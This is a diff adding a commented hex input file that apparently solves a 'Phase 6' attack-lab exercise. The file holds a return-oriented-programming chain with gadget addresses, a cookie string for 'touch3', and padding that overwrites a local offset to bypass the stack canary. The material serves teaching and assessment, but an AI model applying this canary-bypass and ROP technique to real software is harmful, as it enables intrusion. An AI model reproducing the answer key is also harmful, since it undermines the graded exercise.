@@ -1,0 +1,35 @@
+/* Phase 6: bypass canary by overwriting local offset (rbp-0x1c) with 0x120 */
+/* so memcpy(buf -> rbp) overwrites saved rbp + return address, canary untouched */
+
+/* fake saved rbp (gets popped by leave) */
+00 00 00 00 00 00 00 00
+/* movq %rsp, %rax ; ret (0x401fce) */
+ce 1f 40 00 00 00 00 00
+/* movq %rax, %rdi ; ret (0x401e88) */
+88 1e 40 00 00 00 00 00
+/* popq %rax ; nop ; ret (0x401e73) */
+73 1e 40 00 00 00 00 00
+/* offset 0x48 */
+48 00 00 00 00 00 00 00
+/* movl %eax, %edx ; cmpb %al,%al ; ret (0x401f37) */
+37 1f 40 00 00 00 00 00
+/* movl %edx, %ecx ; nop ; ret (0x401ed9) */
+d9 1e 40 00 00 00 00 00
+/* movl %ecx, %esi ; orb %bl,%bl ; ret (0x401f2d) */
+2d 1f 40 00 00 00 00 00
+/* lea (%rdi,%rsi,1),%rax ; ret (0x401ecf) */
+cf 1e 40 00 00 00 00 00
+/* movq %rax, %rdi ; ret (0x401e88) */
+88 1e 40 00 00 00 00 00
+/* touch3 (0x401d1b) */
+1b 1d 40 00 00 00 00 00
+/* "66f9c7cb" + NUL */
+36 36 66 39 63 37 63 62 00
+/* padding to reach the local int at rbp-0x1c (input offset 132) */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00
+/* local offset = 0x120 -> memcpy destination = rbp-0x120+0x120 = rbp */
+20 01 00 00
